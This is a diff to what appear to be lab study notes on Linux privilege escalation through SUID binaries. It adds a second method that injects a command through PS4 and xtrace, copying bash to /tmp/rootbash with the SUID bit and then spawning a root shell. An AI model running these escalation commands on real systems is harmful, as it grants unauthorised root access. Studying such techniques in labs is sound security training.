@@ -1,3 +1,5 @@
+## 1
+
 SUID(Set-user Identification) and SGID(Set-group identification) are two special permissions that can be set on executable files, and These 
 permissions allow the file being executed to be executed with the privileges of the owner or the group. SUID/SGID files can have vulnerabilities 
 that can be exploited to gain root shell.
@@ -23,3 +25,29 @@ Create a Bash function with the name "/usr/sbin/service" that executes a new Bas
 
 Run the suid-env2 executable to gain a root shell:
 > /usr/local/bin/suid-env2
+
+
+
+
+## 2
+
+Note: This will not work on Bash versions 4.4 and above.
+
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+
+Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version 
+of /bin/bash:
+> env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+> /tmp/rootbash -p
+
+
+
+
+
+
+
+
+
+
